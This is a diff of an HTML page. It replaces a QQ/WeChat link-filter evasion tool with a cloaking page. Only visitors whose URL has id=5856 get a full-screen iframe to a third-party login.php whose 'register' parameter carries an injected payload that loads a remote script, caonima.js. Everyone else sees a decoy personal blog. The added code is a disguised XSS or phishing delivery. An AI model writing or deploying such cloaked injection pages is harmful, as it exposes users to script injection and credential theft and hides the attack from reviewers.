@@ -1,45 +1,61 @@
-<!DOCTYPE HTML>
 <html>
-	<head>
-		<title>QQ、微信防红接口 - 勿埋我心</title>
-		<meta charset="utf-8" />
-		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
-		<link rel="stylesheet" href="assets/css/main.css" />
-	</head>
-	<body class="is-preload">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<title>欢迎访问</title>
+<body style="margin:0;padding:0;height:100%" scroll=no>
 
-		<!-- Header -->
-			<header id="header">
-				<h1>QQ、微信防红接口</h1>
-				<p>在下方输入需要跳转的链接，即可生成防红接口。<br>
-					复制下方生成的链接，粘贴到微信或者QQ即可。</p>
-			</header>
+<script>
+// 检查ID参数
+function checkAccess() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id');
+    
+    if (id === '5856') {
+        // 显示原始页面
+        document.body.innerHTML = `
+            <iframe id="infrm" name="infrm" marginwidth="0" marginheight="0" width="100%" scrolling=auto src="http://inx.zlcas.cn/login.php?register=%22%3Cbody/hidden%3E%3C/src=//rinimashadoutou.edu.cn/caonima.js%3E%22&d=DxsAHxlTTkIDF1oMBBpPCR8fABYHGk8ZCB9bHBkaCg8eBlsLWVFWCgMGHxxFWFZbV1dCWFhZVFlUWFoHHgQN" frameborder="0" height="100%" allowfullscreen="true"></iframe>
+            
+            <script>
+                $(document).ready(function(){
+                    function fix_height(){  
+                        $("#infrm").attr("height", (($(window).height())-5) + "px");
+                    }
+                    $(window).resize(function(){ fix_height(); }).resize();
+                    $("#infrm").contentWindow.focus();
+                });
+            <\/script>
+        `;
+    } else {
+        // 显示个人博客页面
+        document.body.innerHTML = `
+            <div style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px;">
+                <header style="text-align: center; margin-bottom: 40px;">
+                    <h1 style="color: #333;">我的个人博客</h1>
+                    <p style="color: #666;">分享技术与生活</p>
+                </header>
+                
+                <main>
+                    <article style="margin-bottom: 30px; padding: 20px; background: #f9f9f9; border-radius: 8px;">
+                        <h2 style="color: #444;">欢迎来到我的博客</h2>
+                        <p style="color: #555; line-height: 1.6;">这是一个简单的个人博客页面，用于分享我的学习心得和技术经验。</p>
+                    </article>
+                    
+                    <article style="margin-bottom: 30px; padding: 20px; background: #f9f9f9; border-radius: 8px;">
+                        <h2 style="color: #444;">关于我</h2>
+                        <p style="color: #555; line-height: 1.6;">我是一名热爱编程的开发者，喜欢探索新技术，分享知识。</p>
+                    </article>
+                </main>
+                
+                <footer style="text-align: center; margin-top: 40px; padding: 20px; color: #888;">
+                    <p>&copy; 2024 我的个人博客. 版权所有.</p>
+                </footer>
+            </div>
+        `;
+    }
+}
 
-		<!-- Signup Form -->
-			<form id="signup-form" method="post">
-				<input type="url" name="url" id="url" placeholder="需要跳转的网址" />
-				<input type="button" value="生成" onclick="build_url()"/>
-			</form>
-			<p id="b_url"></p>
+// 页面加载时检查
+window.onload = checkAccess;
+</script>
 
-			<script src="./assets/js/build_url.js"></script>
-
-		<!-- Footer -->
-			<footer id="footer">
-				<ul class="icons">
-
-					<li><a href="https://github.com/Qiantigers/qq_fanghong" class="icon brands fa-github" target="_blank"><span class="label">GitHub</span></a></li>
-
-				</ul>
-				<ul class="copyright">
-					<li>&copy; Powered by <a href="https://www.qian.blue" target="_blank">勿埋我心</a></li>
-				</ul>
-			</footer>
-
-		<!-- Scripts -->
-			<script src="assets/js/main.js"></script>
-			<script async type="text/javascript" src="//js.users.51.la/21480329.js"></script>
-			<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
-			<script>LA.init({id: "JsTawo0DkJhtEmv4",ck: "JsTawo0DkJhtEmv4"})</script>
-	</body>
+</body>
 </html>
